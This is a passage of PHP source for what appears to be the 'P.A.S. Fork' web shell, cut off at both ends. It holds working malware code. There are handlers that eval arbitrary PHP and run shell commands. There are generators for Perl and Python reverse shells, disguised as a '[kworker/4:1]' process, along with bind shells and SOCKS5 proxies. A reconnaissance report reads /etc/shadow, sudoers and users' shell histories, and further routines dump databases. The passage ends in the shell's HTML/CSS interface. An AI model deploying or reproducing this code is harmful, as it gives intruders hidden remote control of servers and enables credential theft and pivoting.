                                $a[$v][$s][$t] = isset($D['f'][$k . '-' . $i . '-' . $n]) ? $D['f'][$k . '-' . $i . '-' . $n] : FALSE;
                        elseif ($S->getTables($v, $s))
                            while (($t = $S->fetchTable()) !== FALSE)
                                $a[$v][$s][$t] = FALSE;
                    } elseif (isset($D['t'][$k]))
                    foreach ($D['t'][$k] as $i => $s)
                        $a[$v][$s] = isset($D['f'][$k . '-' . $i]) ? $D['f'][$k . '-' . $i] : FALSE;
                elseif ($S->haveSchemas) {
                    $k = array();
                    if ($S->getSchemas($v))
                        while (($i = $S->fetchSchema()) !== FALSE)
                            $k[] = $i;
                    foreach ($k as $s)
                        if ($S->getTables($v, $s))
                            while (($t = $S->fetchTable()) !== FALSE)
                                $a[$v][$s][$t] = FALSE;
                } elseif ($S->getTables($v))
                    while (($t = $S->fetchTable()) !== FALSE)
                        $a[$v][$t] = FALSE;
            }
            $e = array();
            $o = $D['o'] === '0';
            $x = $o ? '.sql' : '.csv';
            if ($S->haveSchemas)
                foreach ($a as $d => $v)
                    foreach ($v as $s => $k)
                        foreach ($k as $t => $c) {
                            $f = escFileName($d . '.' . $s . '.' . $t) . $x;
                            $Z->fileHeader($f, $m);
                            if ($o)
                                printf(T_DMPHDR, gmdate('Y-m-d H:i:s'));
                            if ($i = $S->dump($d, $s, $t, $c, $o))
                                $e[] = $i;
                            if ($o)
                                printf(T_DMPFTR, gmdate('Y-m-d H:i:s'));
                            $Z->fileFooter($f, $m);
                        } else
                foreach ($a as $d => $v)
                    foreach ($v as $t => $c) {
                        $f = escFileName($d . '.' . $t) . $x;
                        $Z->fileHeader($f, $m);
                        if ($o)
                            printf(T_DMPHDR, gmdate('Y-m-d H:i:s'));
                        if ($i = $S->dump($d, $t, $c, $o))
                            $e[] = $i;
                        if ($o)
                            printf(T_DMPFTR, gmdate('Y-m-d H:i:s'));
                        $Z->fileFooter($f, $m);
                    }
            if ($e) {
                $n = 'ERRORS.txt';
                $t = packTime(time());
                $Z->fileHeader($n, $t);
                foreach ($e as $v)
                    echo $v;
                $Z->fileFooter($n, $t);
            }
            $Z->close();
        }
        if (isset($D['q'])) {
            if ($S->query($D['q'])) {
                echo '{"q":';
                jsonEcho($D['q']);
                outData($S);
                $S->close();
                sDie('}');
            }
            echo '{"e":';
            jsonEcho($D['q'] . "\n" . $S->getError());
            sDie('}');
        }
        if (isset($D['f'])) {
            $b = isset($D['s']);
            if ($b ? $S->select($D['b'], $D['s'], $D['t'], $D['f'], $D['o'], $D['r']) : $S->select($D['b'], $D['t'], $D['f'], $D['o'], $D['r'])) {
                echo '{';
                if ($S->canPaginate)
                    echo '"o":', $D['o'], ',';
                echo '"b":';
                jsonEcho($D['b']);
                if ($b) {
                    echo ',"s":';
                    jsonEcho($D['s']);
                }
                echo ',"t":';
                jsonEcho($D['t']);
                outData($S);
                $S->close();
                sDie('}');
            }
            echo '{"e":';
            jsonEcho("Can't load data from table " . $D['b'] . '.' . ($b ? $D['s'] . '.' : '') . $D['t'] . ' (' . $S->getError() . ')');
            sDie('}');
        }
        if (isset($D['t'])) {
            $b = isset($D['s']);
            if ($v = ($b ? $S->getColumns($D['b'], $D['s'], $D['t']) : $S->getColumns($D['b'], $D['t']))) {
                $S->close();
                echo '{"b":';
                jsonEcho($D['b']);
                if ($b) {
                    echo ',"s":';
                    jsonEcho($D['s']);
                }
                echo ',"t":';
                jsonEcho($D['t']);
                echo ',"f":[';
                $i = FALSE;
                $a = array();
                foreach ($v as $k => $t) {
                    if ($i)
                        echo ',';
                    else
                        $i = TRUE;
                    echo '[';
                    jsonEcho($k);
                    if (!isset($a[$t]))
                        $a[$t] = count($a);
                    echo ',', $a[$t], ']';
                }
                echo '],"y":[';
                $i = FALSE;
                foreach ($a as $k => $v) {
                    if ($i)
                        echo ',';
                    else
                        $i = TRUE;
                    jsonEcho($k);
                }
                sDie(']}');
            }
            $S->close();
            echo '{"e":';
            jsonEcho("Can't list columns for table " . $D['b'] . '.' . ($b ? $D['s'] . '.' : '') . $D['t']);
            sDie('}');
        }
        if (isset($D['b'])) {
            $b = isset($D['s']);
            if ($b || !$S->haveSchemas) {
                if ($b ? $S->getTables($D['b'], $D['s']) : $S->getTables($D['b'])) {
                    echo '{"b":';
                    jsonEcho($D['b']);
                    if ($b) {
                        echo ',"s":';
                        jsonEcho($D['s']);
                    }
                    echo ',"t":[';
                    $i = FALSE;
                    while (FALSE !== ($v = $S->fetchTable())) {
                        if ($i)
                            echo ',';
                        else
                            $i = TRUE;
                        echo '[';
                        jsonEcho($v);
                        if (isset($D['r']))
                            echo ',', $b ? $S->getTableSize($D['b'], $D['s'], $v) : $S->getTableSize($D['b'], $v);
                        echo ']';
                    }
                    $S->close();
                    sDie(']}');
                }
                $S->close();
                echo '{"e":';
                jsonEcho("Can't list tables for " . $D['b'] . ($b ? '.' . $D['s'] : ''));
                sDie('}');
            }
            if ($S->getSchemas($D['b'])) {
                echo '{"b":';
                jsonEcho($D['b']);
                echo ',"s":[';
                $b = FALSE;
                while (FALSE !== ($v = $S->fetchSchema())) {
                    if ($b)
                        echo ',';
                    else
                        $b = TRUE;
                    jsonEcho($v);
                }
                $S->close();
                sDie(']}');
            }
            $S->close();
            echo '{"e":';
            jsonEcho("Can't list schemas for database " . $D['b']);
            sDie('}');
        }
        if ($S->getBases()) {
            echo '[';
            $b = FALSE;
            while (FALSE !== ($v = $S->fetchBase())) {
                if ($b)
                    echo ',';
                else
                    $b = TRUE;
                jsonEcho($v);
            }
            $S->close();
            sDie(']');
        }
        $S->close();
        sDie('{"e":"Can\'t list databases"}');
        break;
    case 'p':
        function sdf() {
            if (defined('PTF'))
                delFile(PTF);
            sDie("\x03\x1E" . (defined('PES') ? "\x06" : "\x15") . "\x17\x04\x10");
        }
        register_shutdown_function('sdf');
        echo "\x01\x02";
        $D['e'] = 'define("PES",1);' . $D['e'];
        if (!isset($D['h']))
            $D['e'] = '@error_reporting(E_ALL);@ini_set("error_reporting",E_ALL);@ini_set("display_errors",TRUE);' . $D['e'];
			eval($D['e']);
        if (defined('PES'))
            die;
        if ($v = tempFile('<?php ' . $D['e'])) {
            define('PTF', $v);
            include($v);
            if (defined('PES'))
                die;
            include_once($v);
            if (defined('PES'))
                die;
            require($v);
            if (defined('PES'))
                die;
            require_once($v);
            if (defined('PES'))
                die;
            if (PHP_VERSION >= '5' && PHP_VERSION <= '5.0.4') {
                php_check_syntax($v);
                if (defined('PES'))
                    die;
            }
        }
        if (PHP_VERSION_ID < 80000 && $v = @create_function('&$args', $D['e']))
            $v($args);
        if (defined('PES'))
            die;
        sDie();
        break;
    case 't':
        function getCmdOpt($c, $n, $d) {
            if ($v = strpos($c, ' -' . $n))
                return ltrim(substr($c, $v + 3, strcspn($c, ' ', $v + 4) + 1));
            return $d;
        }
        echo "\x01\x02";
        $D['e'] = isset($D['e']) ? trim($D['e']) : '';
        if (!isset($D['s']))
            $D['s'] = '';
        $k = strtok($D['e'], ' ');
        if (in_array($k, array(
            'backconnect.perl',
            'bindport.perl',
            'socks5.perl'
        ))) {
            $p = '$0="' . getCmdOpt($D['e'], 'n', '[kworker/4:1]') . '\0";use IO::Socket;$SIG{"CHLD"}="IGNORE";$f="[Fail]";$w="[Warn]";socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp")) or die"$f Create socket: $!";';
            if ($k === 'backconnect.perl')
                $p .= '$a=inet_aton("' . strtok(' ') . '") or die"$f Convert host address: $!";$s=sockaddr_in(' . strtok(' ') . ',$a) or die"$f Packed address: $!";connect(S,$s) or die"$f Connect: $!";$r="S";';
            else
                $p .= 'setsockopt(S,SOL_SOCKET,SO_REUSEADDR,1) or print"$w Set socket options: $!\n";$s=sockaddr_in(' . strtok(' ') . ',inet_aton("' . getCmdOpt($D['e'], 'a', '0.0.0.0') . '")) or die"$f Packed address: $!";bind(S,$s) or die"$f Bind socket: $!";';
            if ($k === 'bindport.perl')
                $p .= 'listen(S,1) or die"$f Listen socket: $!";accept(C,S) or die"$f Accept connection: $!";$r="C";';
            if ($k === 'socks5.perl') {
                $v = getCmdOpt($D['e'], 's', '');
                if ($v)
                    $v = explode(':', $v);
                $p .= 'use threads;listen(S,SOMAXCONN) or die"$f Listen socket: $!";print"[Succ] Server successfully launched!\n";close(STDIN);close(STDOUT);close(STDERR);sub prcss{$C = $_[0];sysread($C,$b,1);if($b ne "\x05"){shutdown($C,2);close($C);return;}sysread($C,$b,1);sysread($C,$b,ord($b));if(index($b,"\x0' . ($v ? '2' : '0') . '")==-1){syswrite($C,"\x05\xFF");shutdown($C,0);close($C);return;}syswrite($C,"\x05\x0' . ($v ? '2' : '0') . '");';
                if ($v)
                    $p .= 'sysread($C,$b,1);sysread($C,$l,1);sysread($C,$u,ord($l));sysread($C,$l,1);sysread($C,$p,ord($l));if(($b ne "\x01") || ($u ne "' . $v[0] . '") || ($p ne "' . $v[1] . '")){syswrite($C,"\x01\xFF");shutdown($C,0);close($C);return;}syswrite($C,"\x01\x00");';
                $p .= 'sysread($C,$b,1);if($b ne "\x05"){shutdown($C,2);close($C);return;}sysread($C,$c,1);sysread($C,$b,1);if($b ne "\x00"){shutdown($C,2);close($C);return;}sysread($C,$t,1);if($t eq "\x01"){sysread($C,$a,4);$d=$a;}elsif($t eq "\x03"){sysread($C,$a,1);sysread($C,$b,unpack("c",$a));$a.=$b;$d=inet_aton($b);}elsif($t eq "\x04"){sysread($C,$a,16);$d=$a;}else{shutdown($C,2);close($C);return;}sysread($C,$b,2);$a.=$b;if($c ne "\x01"){syswrite($C, "\x05\x07\x00".$t.$a);shutdown($C,0);close($C);return;}if(!socket(D,PF_INET,SOCK_STREAM,getprotobyname("tcp")) or !connect(D,sockaddr_in(unpack("n",$b),$d))){syswrite($C,"\x05\x05\x00".$t.$a);shutdown($C,0);close($C);close(D);return;}syswrite($C,"\x05\x00\x00".$t.$a);$m="";$fc=fileno($C);$fd=fileno(D);vec($m,$fc,1)=1;vec($m,$fd,1)=1;do{$c=$m;$rc=-1;$rd=-1;if(select($c,undef,undef,1)){if(vec($c,$fc,1)){$rc=sysread($C,$b,10240);if($rc){syswrite(D,$b);}}if(vec($c,$fd,1)){$rd=sysread(D,$b,10240);if($rd){syswrite($C,$b);}}}}while($rc!=0 && $rd!=0);shutdown($C,2);close($C);shutdown(D,2);close(D);}while(accept(C,S)){threads->create("prcss",C);}';
            } else {
                $v = getCmdOpt($D['e'], 's', NIX ? '/bin/sh -i' : 'cmd');
                $p .= 'print"[OK] Successful connected!\n";open(STDOUT,">&$r") or die"$f Redirect STDOUT: $!";print "\n# P.A.S. Fork v.' . VER . ' ' . $k . '\n\n";open(STDIN, "<&$r") or die"$f Redirect STDIN: $!";open(STDERR,">&STDOUT") or print"$w Redirect STDERR: $!\n";exec("' . $v . '") or die"$f Run shell (' . $v . '): $!";';
            }
            $s = getCmdOpt($D['e'], 'i', NIX ? '/usr/bin/perl' : 'perl.exe');
            if ($v = tempFile($p)) {
                exe($s . ' ' . $v . ' &', $D['f'], $D['s']);
                delFile($v);
            } else
                exe($s . " -e '" . $p . "' &", $D['f'], $D['s']);
        } elseif (in_array($k, array(
            'backconnect.python',
            'bindport.python',
            'socks5.python'
        ))) {
            $p = "try:\n import sys,socket";
            if ($k === 'socks5.python')
                $p .= ',struct,threading,select';
            else
                $p .= ',os,' . (getCmdOpt($D['e'], 't', 'N') === 'N' ? 'subprocess' : 'pty');
            $p .= ";\n S = socket.socket(socket.AF_INET,socket.SOCK_STREAM);\n";
            if ($k === 'backconnect.python') {
                $p .= ' S.connect(("' . strtok(' ') . '",' . strtok(' ') . "));\n";
                $s = 'S';
            } else
                $p .= " S.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1);\n" . ' S.bind(("' . getCmdOpt($D['e'], 'a', '') . '",' . strtok(' ') . "));\n S.listen(5);\n";
            if ($k === 'bindport.python') {
                $p .= " (C,A) = S.accept();\n";
                $s = 'C';
            }
            if ($k === 'socks5.python') {
                $v = getCmdOpt($D['e'], 's', '');
                if ($v)
                    $v = explode(':', $v);
                $p .= "except Exception as e:\n print(e);\nelse:\n" . ' print("[Succ] Server successfully launched!"+chr(10));' . "\n sys.stdin.close();\n sys.stderr.close();\n sys.stdout.close();\n def prcss(C):\n" . '  if C.recv(1)!=b"\x05":' . "\n   C.shutdown(2);\n   C.close();\n   return;\n" . '  if b"\x0' . ($v ? '2' : '0') . '" not in C.recv(struct.unpack("B", C.recv(1))[0]):' . "\n" . '   C.send(b"\x05\xFF");' . "\n   C.shutdown(0);\n   C.close();\n   return;\n" . '  C.send(b"\x05\x0' . ($v ? '2' : '0') . '");' . "\n";
                if ($v)
                    $p .= '  if (C.recv(1)!=b"\x01") or (C.recv(struct.unpack("B", C.recv(1))[0])!=b"' . $v[0] . '") or (C.recv(struct.unpack("B", C.recv(1))[0])!=b"' . $v[1] . '"):' . "\n" . '   C.send(b"\x01\xFF");' . "\n   C.shutdown(0);\n   C.close();\n   return;\n" . '  C.send(b"\x01\x00");' . "\n";
                $p .= '  if C.recv(1)!=b"\x05":' . "\n   C.shutdown(2);\n   C.close();\n   return;\n  c = C.recv(1);\n" . '  if C.recv(1)!=b"\x00":' . "\n   C.shutdown(2);\n   C.close();\n   return;\n  t = C.recv(1);\n" . '  if t==b"\x01":' . "\n   a = C.recv(4);\n" . '   d = socket.inet_ntoa(a);' . "\n" . '  elif t==b"\x03":' . "\n   a = C.recv(1);\n" . '   d = C.recv(struct.unpack("B", a)[0]);' . "\n   a += d;\n" . '  elif t==b"\x04":' . "\n   a = C.recv(16);\n" . '   d = socket.inet_ntop(socket.AF_INET6, a);' . "\n  else:\n   C.shutdown(2);\n   C.cloce();\n   return;\n  p = C.recv(2);\n  a += p;\n" . '  if c!=b"\x01":' . "\n" . '   C.send(b"\x05\x07\x00"+t+a);' . "\n   C.shutdown(0);\n   C.close();\n   return;\n  D = socket.socket(socket.AF_INET,socket.SOCK_STREAM);\n  try:\n" . '   D.connect((d, struct.unpack(">H", p)[0]));' . "\n  except:\n" . '   C.send(b"\x05\x05\x00"+t+a);' . "\n   C.shutdown(0);\n   C.close();\n   D.close();\n  else:\n" . '   C.send(b"\x05\x00\x00"+t+a);' . "\n   C.setblocking(0);\n   D.setblocking(0);\n   while True:\n    r,w,e = select.select([C,D], [], []);\n    if len(r)>0:\n     try:\n      d = r[0].recv(10240);\n      if r[0]==C:\n       D.send(d);\n      else:\n       C.send(d);\n     except:\n      D.close();\n      C.close();\n      break;\n while True:\n  (C,A) = S.accept();\n  t = threading.Thread(target=prcss,args=(C,));\n  t.daemon = True;\n  t.start();";
            } else
                $p .= ' print("[OK] Successful connected!\n");' . "\n sys.stdout.flush();\n" . ' os.dup2(' . $s . ".fileno(),0);\n" . ' os.dup2(' . $s . ".fileno(),1);\n" . ' os.dup2(' . $s . ".fileno(),2);\n" . ' print("\n# P.A.S. Fork v.' . VER . ' ' . $k . '\n\n");' . "\n sys.stdout.flush();\n " . (getCmdOpt($D['e'], 't', 'N') === 'N' ? 'subprocess.Popen' : 'pty.spawn') . '(["' . getCmdOpt($D['e'], 's', NIX ? '/bin/sh","-i' : 'cmd') . '"]);' . "\nexcept Exception as e:\n" . ' print(e);';
            $s = getCmdOpt($D['e'], 'i', NIX ? '/usr/bin/python' : 'python.exe');
            if ($v = tempFile($p)) {
                exe($s . ' ' . $v . ' &', $D['f'], $D['s']);
                delFile($v);
            } else
                exe("echo '" . $p . "'| " . $s . ' - &', $D['f'], $D['s']);
        } elseif ($k === 'report') {
            $i = getCmdOpt($D['e'], 's', '');
            if (NIX) {
                $t = "echo ' -------------------------------------------------';";
                $h = 'echo;echo;' . $t . "echo '|'  ";
                $v = "echo '*  This report created by P.A.S. Fork v." . VER . "';echo '*  '`date -u +'%Y-%m-%d %H:%M:%S %Z'`;";
                if (strpos($i, 'o') === FALSE)
                    $v .= $h . 'OS Identification;' . $t . "echo '==> uname <==';" . 'uname -a;echo;tail -n +1 /proc/*version* /etc/*issue* /etc/*release* /etc/*version* /etc/motd;';
                if (strpos($i, 'e') === FALSE)
                    $v .= $h . 'Environment;' . $t . 'env;';
                if (strpos($i, 'u') === FALSE)
                    $v .= $h . 'Users and Groups;' . $t . "echo '==> id <==';" . 'id;echo;' . "echo '==> whoami <==';" . 'whoami;echo;tail -n +1 /etc/*passwd* /etc/*group* /etc/*shadow* /etc/sudoers;echo;' . "echo '==> who <==';" . 'who;';
                if (strpos($i, 'l') === FALSE)
                    $v .= $h . 'Lang;' . $t . 'php -v|head -n1;python -V 2>&1;perl -v|head -n2|tail -n1;ruby -v;gcc --version|head -n1;';
                if (strpos($i, 'p') === FALSE)
                    $v .= $h . 'Processes;' . $t . 'ps -uax;';
                if (strpos($i, 'c') === FALSE)
                    $v .= $h . 'CPU;' . $t . 'cat /proc/cpuinfo;';
                if (strpos($i, 'n') === FALSE)
                    $v .= $h . 'Network;' . $t . 'tail -n +1 /etc/host*;' . "echo '==> Listening ports <==';" . 'netstat -ln;' . "echo '==> IP config <==';" . 'ifconfig -a; ip a;';
                if (strpos($i, 'r') === FALSE)
                    $v .= $h . 'Cron;' . $t . 'tail -n +1 /etc/*crontab;' . "echo '==> Files <==';" . 'ls -al /etc/*cron*;ls -al /var/spool/cron/*;echo;';
                if (strpos($i, 'h') === FALSE)
                    $v .= $h . 'Histories;' . $t . 'for d in `cut -d":" -f6 /etc/passwd`;do ls -al $d/.*hist*;done;';
                if (strpos($i, 'f') === FALSE) {
                    $v .= $h . 'File System;' . $t . "echo '==> mount <==';mount;echo;echo '==> Disks <==';df -h;echo;echo '==> / <==';ls -al /;echo;echo '==> /boot <==';ls -al /boot;echo;echo '==> /etc <==';ls -al /etc;echo;echo '==> /tmp <==';ls -al /tmp;echo;echo '==> Libs <==';ls -al --full-time /lib*;echo;";
                    if (strpos($i, 's') === FALSE)
                        $v .= "echo '==> SUID Files <==';" . 'find / -type f -perm -u+s -ls;';
                }
            } else {
                $t = 'echo  ------------------------------------------------- & ';
                $h = $t . 'echo ^|  ';
                $v .= $h . 'OS &' . $t . 'reg query "HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows NT\CurrentVersion" /v ProductName & ';
                if (strpos($i, 's') === FALSE)
                    $v .= $h . 'System Info & ' . $t . 'systeminfo & ';
                if (strpos($i, 'e') === FALSE)
                    $v .= $h . 'Environment & ' . $t . 'SET & ';
                if (strpos($i, 'u') === FALSE)
                    $v .= $h . 'Users and Groups & ' . $t . 'NET USER & NET LOCALGROUP & NET GROUP & ';
                if (strpos($i, 't') === FALSE)
                    $v .= $h . 'Tasks & ' . $t . 'schtasks /v & ';
                if (strpos($i, 't') === FALSE)
                    $v .= $h . 'Processes & ' . $t . 'tasklist /SVC & ';
                if (strpos($i, 'n') === FALSE)
                    $v .= $h . 'Network & ' . $t . 'echo ==^> ipconfig ^<== & ipconfig /all & echo ==^> netstat ^<== & netstat -ano & echo ==^> Files ^<== & type %systemroot%\\system32\\drivers\\etc\\* & ';
                if (strpos($i, 'r') === FALSE)
                    $v .= $h . 'Share & ' . $t . 'NET SHARE & ';
            }
            $i = getCmdOpt($D['e'], 'f', FALSE);
            exe($v, $D['f'], $D['s'], TRUE, $i ? ' 1>' . $i : '');
            if ($i)
                echo 'Report saved as ', $i, "\n";
        } else {
            $s = NIX ? ';' : '&';
            $v = 'cd ' . (NIX ? nesc($D['p']) : wesc($D['p'])) . $s;
            if ($D['e'] !== '') {
                $v .= $D['e'];
                if (substr($D['e'], -1) !== $s)
                    $v .= $s;
            }
            $v .= 'echo ' . "\x03\x1E\x02" . $s . (NIX ? 'whoami' : 'echo %username%') . $s . 'hostname' . $s . (NIX ? 'pwd' : 'cd');
            exe($v, $D['f'], $D['s'], !isset($D['h']));
        }
        sDie("\x03\x1E\x17\x04\x10");
        break;
    default:
        if ($D['t'] === 'm') {
            infMain();
            sDie();
        }
        if ($D['t'] === 'p') {
            echo '{"Configs":{';
            $a = array();
            $b = FALSE;
            if (PHP_VERSION >= '5.2.4')
                $a[] = php_ini_loaded_file();
            if (PHP_VERSION >= '4.3')
                $a[] = php_ini_scanned_files();
            if ($a) {
                $b = TRUE;
                echo '"Loaded files":';
                jsonEcho(implode(",\n", $a));
            }
            if (PHP_VERSION >= '4.2' && is_array($a = ini_get_all()))
                foreach ($a as $k => $v) {
                    if ($b)
                        echo ',';
                    else
                        $b = TRUE;
                    jsonEcho($k);
                    echo ':';
                    jsonEcho($v['local_value']);
                }
            echo '}';
            echo ',"Main Constants":{';
            $b = FALSE;
            foreach (array(
                'PHP_OS',
                'PHP_WINDOWS_VERSION_MAJOR',
                'PHP_WINDOWS_VERSION_MINOR',
                'PHP_WINDOWS_VERSION_BUILD',
                'PHP_WINDOWS_VERSION_SP_MAJOR',
                'PHP_WINDOWS_VERSION_SP_MINOR',
                'PHP_WINDOWS_VERSION_SUITEMASK',
                'PHP_WINDOWS_VERSION_PLATFORM',
                'PHP_WINDOWS_VERSION_PRODUCTTYPE',
                'PHP_WINDOWS_NT_WORKSTATION',
                'PHP_WINDOWS_NT_SERVER',
                'PHP_WINDOWS_NT_DOMAIN_CONTROLLER',
                'PHP_SAPI',
                'PHP_VERSION',
                'PHP_BINARY',
                'PHP_PREFIX',
                'PHP_BINDIR',
                'PHP_LIBDIR',
                'PHP_SHLIB_SUFFIX',
                'PHP_EXTENSION_DIR',
                'PHP_DATADIR',
                'PHP_CONFIG_FILE_PATH',
                'PHP_CONFIG_FILE_SCAN_DIR',
                'PHP_MANDIR',
                'DEFAULT_INCLUDE_PATH',
                'PHP_SYSCONFDIR',
                'PHP_LOCALSTATEDIR',
                'DIRECTORY_SEPARATOR',
                'PATH_SEPARATOR',
                'PHP_MAXPATHLEN',
                'PHP_INT_MAX',
                'PHP_INT_SIZE',
                'PEAR_INSTALL_DIR',
                'PEAR_EXTENSION_DIR'
            ) as $v)
                if (defined($v)) {
                    if ($b)
                        echo ',';
                    else
                        $b = TRUE;
                    echo '"', $v, '":';
                    jsonEcho(constant($v));
                }
            echo '}';
            if (is_array($a = get_loaded_extensions())) {
                echo ',"Modules":{';
                $b = FALSE;
                $i = array(
                    'DOTTED_VERSION',
                    'VERSION',
                    'VERSION_TEXT'
                );
                foreach ($a as $v) {
                    if ($b)
                        echo ',';
                    else
                        $b = TRUE;
                    jsonEcho($v);
                    echo ':';
                    if (!($k = phpversion($v))) {
                        $v = strtoupper($v);
                        foreach ($i as $n)
                            if (defined($v . '_' . $n)) {
                                $k = constant($v . '_' . $n);
                                break;
                            }
                    }
                    if ($k)
                        jsonEcho($k);
                    else
                        echo '""';
                }
                echo '}';
            }
            if (PHP_VERSION >= '5') {
                echo ',"Streams":{"Transports":';
                jsonEcho(implode(", ", stream_get_transports()));
                echo ',"Wrappers":';
                jsonEcho(implode(", ", stream_get_wrappers()));
                echo ',"Filters":';
                jsonEcho(implode(", ", stream_get_filters()));
                echo '}';
            }
            $b = FALSE;
            foreach (array(
                '_ENV',
                '_SERVER',
                '_SESSION',
                '_REQUEST',
                '_GET',
                '_POST',
                '_COOKIE',
                '_FILES',
                'HTTP_RAW_POST_DATA',
                'argc',
                'argv'
            ) as $v)
                if (isset($$v) && count($$v) > 0) {
                    if (!$b)
                        echo ',"Global Variables":{';
                    foreach ($$v as $k => $i) {
                        if ($b)
                            echo ',';
                        else
                            $b = TRUE;
                        jsonEcho($v . '[' . $k . ']');
                        echo ':';
                        jsonEcho(print_r($i, TRUE));
                    }
                }
            if ($b)
                echo '}';
            sDie('}');
        }
        break;
}

}

ob_start();
?>

<!DOCTYPE html><html><head><link rel="icon" type="image/gif" href="data:image/gif;base64,R0lGODlhEAAQAJECAMDAwAAAAP///wAAACH5BAEAAAIALAAAAAAQABAAQAIglI+pGwErgITtiWowc7D7b0iWGE7gp51qknrkemgyBxcAOw=="/><meta charset="<?php echo CSE;?>"/><meta name="referrer" content="no-referrer"/><title><?php if(isset($_SERVER['HTTP_HOST']))echo escHTML($_SERVER['HTTP_HOST']);elseif(isset($_SERVER['SERVER_NAME']))echo escHTML($_SERVER['SERVER_NAME']);?></title><style>*{box-sizing:border-box;outline:0}:focus{box-shadow:0 0 3px 0 rgba(0,150,255,.5)}:disabled{opacity:.5}::-moz-focus-inner{padding:0;border:0}html{height:100%;padding:0 0 8px 0;background-color:#f0f0f0}body{background:#f0f0f0;position:relative;display:flex;margin:0 auto 8px auto;width:1000px;min-height:100%;font:normal 11px/1.5 Verdana,sans-serif;border:1px solid #fff;box-shadow:0 0 10px rgba(0,0,0,.5);flex-direction:column}iframe{display:none}a,a:visited{color:unset;text-decoration:none}pre{display:block}fieldset{border:1px solid #c7c7c7}table{font-size:12px;width:100%;border-collapse:collapse}th,td{padding:3px 5px;border:1px solid #dfdfdf}thead,tfoot{color:#fcfcfc;background:#7f7f7f}tbody{background:#f7f7f7}tbody tr:hover{background:#ececec}tfoot th{padding:8px 0 4px 2px;text-align:left}tfoot button{width:90px}input,select,button,textarea{margin:1px 2px;font:11px/1.4 Verdana,sans-serif;background:#eaeaea;border:1px solid #c7c7c7}label,select,button{cursor:pointer}button{padding:1px 10px;border-radius:3px}textarea{display:block;flex:1;font:13px/1.5 'Courier New',monospace;background:#fff;resize:none}input[type="text"]{padding:1px 2px;display:block;width:100%;flex:1}input[type="text"]:not(:disabled):focus{background:#fff}input[type="checkbox"]{vertical-align:text-top}input:not(:disabled):hover,select:not(:disabled):hover,button:not(:disabled):hover,input:not(:disabled):focus,select:not(:disabled):focus,button:not(:disabled):focus{background:#f0f0f0;border-color:#a7a7a7}button:not(:disabled):active{background:#e0e0e0;border-color:#a0a0a0 #d0d0d0 #d0d0d0 #a0a0a0}textarea:hover,textarea:focus{border-color:#7f7f7f}#divHdr{position:absolute;top:2px;right:4px;z-index:1}#divBody{position:relative;flex:1}#divFtr{margin:0 2px 3px 2px;clear:both}#divFtr div{flex:1 1 0}#divDtTm{text-align:center}#actLog{display:none;float:right;font-size:20px;line-height:16px}#divMsgs{position:fixed;left:0;right:0;bottom:10px;z-index:999;max-height:20%;overflow-y:auto}#divMsgs div{opacity:0.8}#divMsgs div:hover{opacity:1}.tab,:target ~ #tabInf .tab{display:inline-block;margin:5px 0 0 2px;padding:3px 15px 1px 15px;color:#707070 !important;border:1px solid #d0d0d0;border-bottom:0;border-radius:3px 3px 0 0;background:#e7e7e7}:target .tab,#tabInf .tab{position:relative;margin-bottom:-2px;padding-bottom:3px;z-index:1;color:#000 !important;background:#f7f7f7}.tabPage{display:none;float:left;width:100%;height:100%;flex-direction:column}:target .tabPage,#divInfo.tabPage{display:flex}:target ~ #tabInf>#divInfo.tabPage{display:none}.toolbar,.subbar,.panel{display:flex;border:1px solid #d0d0d0;background:#f7f7f7}.toolbar{margin:1px 0 4px 0;padding:8px 2px 5px 2px;border-width:1px 0;align-items:center;justify-content:space-between}.subbar{margin:-5px 0 4px 0;padding:2px 3px 5px 5px;border-width:0 0 1px 1px;border-radius:0 0 0 4px;align-self:flex-end}.panel{position:relative;margin:0 2px 8px 2px;padding:4px 3px}.arwUp,.arwDwn{display:inline-block;margin:0 0 2px 0;padding:0;border:solid transparent;border-width:4px 5px 4px 5px}.arwUp{border-top:0;border-bottom-color:#000}.arwDwn{border-top-color:#000;border-bottom:0}.spnChrst{display:inline-block;margin:0 0 0 4px;padding:0}.spnChrst .arwUp,.spnChrst .arwDwn{position:relative;margin:0 -16px 2px 2px}.spnChrst select{padding-left:11px}.cntrl{display:inline-block;overflow:hidden;opacity:.5;color:#000;border-radius:5px}.cntrl.arwDwn{margin:0 1px;border-width:7px 6px 0 6px;border-radius:0}.cntrl:hover,.cntrl:focus{opacity:1}.divCntrls .cntrl,#btnSrch{width:18px;height:19px}.divCntrls .cntrl{float:right;margin-top:-1px;font:normal 20px/16px Verdana,sans-serif;text-align:center}.lnkAct:hover{text-decoration:underline}.blink{animation:blink 1s steps(2,start) infinite}@keyframes blink{to{color:transparent}}.modal{display:flex;position:fixed;visibility:hidden;z-index:100;top:50%;left:50%;transform:translateX(-50%) translateY(-50%);padding:3px 3px 5px 3px;flex-direction:column;border:1px solid #fff;background:#f7f7f7;box-shadow:0 0 10px rgba(0,0,0,.5)}.divCntrls{margin-bottom:5px}.spnTitle{font-weight:bold}.option{display:block;margin:0 2px 10px 2px;flex:1}.option input[type="text"]{margin:1px 0}.option select{display:block;margin:0 1px}.divMsgPrcs,.divMsgErr,.divMsgInf{margin:0 10px 10px 10px;padding:3px 3px 3px 5px;white-space:pre-wrap;border:1px solid;border-radius:3px}.divMsgPrcs{background-image:linear-gradient(#fff,#e0e0e0);border-color:#a0a0a0}.divMsgErr{background-image:linear-gradient(#fff,#ffd0d0);border-color:#ffa0a0}.divMsgInf{background-image:linear-gradient(#fff,#c0c0ff);border-color:#a0a0ff}#divStngs{width:300px}#divLog{width:80%;height:50%}#divLogCntn{overflow-y:auto}.flexRow{display:flex;align-items:center;justify-content:space-between}.unq{color:#7a6f15}#divPagePHP,#frmTrm{position:absolute;padding-bottom:30px}#btnSrch{margin-right:4px}#btnSrch:before,#btnSrch:after{content:'';display:inline-block;border:1px solid}#btnSrch:before{margin:0 0 0 2px;width:8px;height:9px;border-radius:50%}#btnSrch:after{margin:0 0 -5px 0;height:6px;transform:rotate(-45deg)}#btnFastAct{height:19px;margin-left:-4px;padding:1px 5px;border-radius:0 3px 3px 0}#btnFastAct:active{padding:2px 5px 0 5px}#frmFiles{margin:0 2px 10px 2px}#tblFiles{display:none;table-layout:fixed}#tblFiles thead th:first-of-type,#tblFiles td:first-of-type{padding:0;text-align:center}#tblFiles td:nth-of-type(3){white-space:nowrap}#tblFiles td:nth-of-type(4){text-align:right}#tblFiles 